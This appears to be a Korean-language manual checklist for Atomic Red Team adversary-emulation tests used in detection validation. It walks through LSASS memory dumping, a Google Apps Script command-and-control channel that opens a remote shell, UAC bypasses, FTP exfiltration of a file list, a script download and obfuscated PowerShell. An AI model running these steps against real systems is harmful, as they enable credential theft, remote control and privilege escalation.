자동 스크립트로 테스트 진행하기 어려운 항목들을 따로 모은 수동 테스트 가이드입니다. 
각 항목별로 Step에 맞춰 테스트를 진행 해주세요.


#------------------------------------------------------------
# T1003.001 - OS Credential Dumping: LSASS Memory
# Atomic Test 5 - Dump LSASS.exe Memory using Windows Task Manager
#------------------------------------------------------------
Step 1. task manager(작업관리자) 실행
Step 2. "Details" 탭에서 lsass.exe 선택
Step 3. 우 클릭 후 "create dump file"

#------------------------------------------------------------
# T1102.002A - Web Service: Bidirectional Communication
# Atomic Test #1 - C2 using Google Apps Script - google_RAT
#------------------------------------------------------------
[Client PC - Windows10]
Step 1. Open "cmd.exe"
Step 2. cd <inplant.py 위치>
Step 3. python test.py -k test https://script.google.com/macros/s/AKfycbzVbXkfOAJTmzxSUDeeuyYW-RJ6CMrFzF8bWtXObtSQWMmzINoXgi2isks5S2m6q6X7kw/exec

[Attacker's Server - Kali]
Step 1. cd /home/kali/바탕화면/google_RAT-master
Step 2. python3 master.py -k test https://script.google.com/macros/s/AKfycbzVbXkfOAJTmzxSUDeeuyYW-RJ6CMrFzF8bWtXObtSQWMmzINoXgi2isks5S2m6q6X7kw/exec
Step 3. lsc         # UUID 확인
Step 4. shell <uuid>   # Step 3에서 확인한 UUID 입력

#------------------------------------------------------------
# T1112 - Modify Registry
# Atomic Test #41 - Terminal Server Client Connection History Cleared
#------------------------------------------------------------
Step 1. "Windows 10 PC(192.168.1.10)" -> "Windows Server 2019(192.168.1.100)" RDP 로그온 
Step 2. invoke-atomictest T1112 -testnumber 41 -ExecutionLogPath $ExecutionLogPath # 관리자 권한
Step 3. invoke-atomictest T1112 -testnumber 41 -Cleanup -ExecutionLogPath $ExecutionLogPath  # 관리자 권한

#------------------------------------------------------------
# T1218 - Signed Binary Proxy Execution
# Atomic Test #4 - ProtocolHandler.exe Downloaded a Suspicious File
#------------------------------------------------------------
Step 1. invoke-atomictest T1218 -testnumber 4 -ExecutionLogPath $ExecutionLogPath  # 성공적으로 실행되면, Microsoft Office 관련 Alert창이 나타남.
Step 2. Alert 창에서 "yes"를 클릭  # 성공적으로 실행되면 MS Word가 실행되며 빈 페이지가 나타남.

#------------------------------------------------------------
T1548.002 - Abuse Elevation Control Mechanism: Bypass User Access Control
#------------------------------------------------------------
# Atomic Test #9 - Bypass UAC using SilentCleanup task
Step 1. invoke-atomictest t1548.002 -testnumber 9 -ExecutionLogPath $ExecutionLogPath # 성공적으로 실행되면, 실행 중이던 Powershell 터미널은 종료되고 Administrator 권한의 Powershell 터미널이 생성됨

# Atomic Test #11 - UACME Bypass Method 31
Step 1. invoke-atomictest t1548.002 -testnumber 11 -GetPrereqs -ExecutionLogPath $ExecutionLogPath
Step 2. invoke-atomictest t1548.002 -testnumber 11 -ExecutionLogPath $ExecutionLogPath


# Atomic Test #12 - UACME Bypass Method 33
Step 1. invoke-atomictest t1548.002 -testnumber 12 -GetPrereqs -ExecutionLogPath $ExecutionLogPath
Step 2. invoke-atomictest t1548.002 -testnumber 12 -ExecutionLogPath $ExecutionLogPath # 관리자 권한 cmd.exe 창 실행


# Atomic Test #13 - UACME Bypass Method 34
Step 1. invoke-atomictest t1548.002 -testnumber 13 -GetPrereqs -ExecutionLogPath $ExecutionLogPath
Step 2. invoke-atomictest t1548.002 -testnumber 13 -ExecutionLogPath $ExecutionLogPath # 관리자 권한 cmd창 실행


# Atomic Test #14 - UACME Bypass Method 39
Step 1. invoke-atomictest t1548.002 -testnumber 14 -GetPrereqs -ExecutionLogPath $ExecutionLogPath
Step 2. invoke-atomictest t1548.002 -testnumber 14 -ExecutionLogPath $ExecutionLogPath # 관리자 권한 cmd창 실행


# Atomic Test #15 - UACME Bypass Method 56
Step 1. invoke-atomictest t1548.002 -testnumber 15 -GetPrereqs -ExecutionLogPath $ExecutionLogPath
Step 2. invoke-atomictest t1548.002 -testnumber 15 -ExecutionLogPath $ExecutionLogPath


# Atomic Test #16 - UACME Bypass Method 59
Step 1. invoke-atomictest t1548.002 -testnumber 16 -GetPrereqs -ExecutionLogPath $ExecutionLogPath
Step 2. invoke-atomictest t1548.002 -testnumber 16 -ExecutionLogPath $ExecutionLogPath

# Atomic Test #17 - UACME Bypass Method 61
Step 1. invoke-atomictest t1548.002 -testnumber 17 -GetPrereqs -ExecutionLogPath $ExecutionLogPath
Step 2. invoke-atomictest t1548.002 -testnumber 17 -ExecutionLogPath $ExecutionLogPath

#------------------------------------------------------------
T1564.008A - Hide Artifacts: Email Hiding Rules
Atomic Test #1 -"Email Hiding Rules - New-InboxRule"
#------------------------------------------------------------
Step 1. Exchange Management Shell 실행
Step 2. New-InboxRule -Name Spammail -mailbox Administrator@contoso.com -subjectcontainswords "[hacking]" -movetofolder "administrator@contoso.com:\Junk Email" 입력 # 메일을 수신할 때, 특정 키워드가 포함될 시 Junk Email 수신함으로 이동하도록 Rule 설정
Step 3. invoke-atomictest T1564.008A -testnumber 1 -ExecutionLogPath $ExecutionLogPath # "[hacking]" 키워드가 포함되어있는 메일 발송
Step 4. https://localhost/owa/#path=/mail 로그인 # 계정 : contoso\administrator, 패스워드: administrator 계정 패스워드 동일)
Step 5. Junk Email 수신함에서 메일 확인



#------------------------------------------------------------
T1005A - Data from Local System
#------------------------------------------------------------
Step 1. cmd /c dir /s/b *.exe > C:\R5\atomic-red-team\atomics\T1005A\src\exe_list.txt
Step 2. ftp -v -n -i -d -s:C:\R5\atomic-red-team\atomics\T1005A\src\ftp_script.txt
Step 3. bye
Step 4. del C:\R5\atomic-red-team\atomics\T1005A\src\exe_list.txt




#------------------------------------------------------------
T1105 - Ingress Tool Transfer
Atomic Test #26 - Download a file using wscript
#------------------------------------------------------------
Step 1. wscript "C:\R5\atomic-red-team\atomics\T1105\src\T1105-download-file.vbs"
Step 2. del .\Atomic-License.txt


#------------------------------------------------------------
# T1027 - Obfuscated Command in PowerShell
#------------------------------------------------------------
Step1. $cmDwhy =[TyPe]("{0}{1}" -f 'S','TrING')  ;   $pz2Sb0  =[TYpE]("{1}{0}{2}"-f'nv','cO','ert')  ;  &("{0}{2}{3}{1}{4}" -f'In','SiO','vOKe-EXp','ReS','n') (  (&("{1}{2}{0}"-f'blE','gET-','vaRIA')  ('CMdw'+'h'+'y'))."v`ALUe"::("{1}{0}" -f'iN','jO').Invoke('',( (127, 162,151, 164,145 ,55 , 110 ,157 ,163 , 164 ,40,47, 110 , 145 ,154, 154 ,157 , 54 ,40, 146, 162 , 157,155 ,40, 120, 157 ,167,145 , 162 ,123,150 ,145 , 154 , 154 , 41,47)| .('%') { ( [CHAR] (  $Pz2sB0::"t`OinT`16"(( [sTring]${_}) ,8)))})) )